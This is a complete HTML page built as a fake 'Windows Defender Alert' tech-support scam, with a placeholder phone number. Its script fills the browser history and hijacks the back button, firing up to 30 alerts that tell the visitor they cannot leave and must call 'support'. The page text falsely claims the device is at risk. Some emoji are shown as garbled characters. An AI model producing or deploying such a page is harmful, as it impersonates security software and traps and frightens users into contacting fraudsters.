<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Back Button Lock</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    html, body {
      background-color: black;
      color: white;
      text-align: center;
      font-family: sans-serif;
      margin: 0;
      padding: 20px;
    }
    h1 {
      color: red;
    }
  </style>
  <script>
    // Fill browser history to prevent instant exit
    for (let i = 0; i < 5; i++) {
      history.pushState({}, '', location.href + '#' + i);
    }

    let backAlertCount = 0;

    window.onpopstate = function () {
      if (backAlertCount < 30) {
        backAlertCount++;
        alert(`üö´ Warning ${backAlertCount}/30:\nYou cannot go back!\nCall support immediately.`);
        history.pushState({}, '', location.href + '#' + Math.random());
      }
    };
  </script>
</head>
<body>
  <h1>‚ö†Ô∏è Windows Defender Alert</h1>
  <p>Your device is at risk!</p>
  <p>Call technical support immediately: <strong>+1-800-FAKE-NUM</strong></p>
  <p>Pressing back is blocked 30 times as a protection.</p>
</body>
</html>
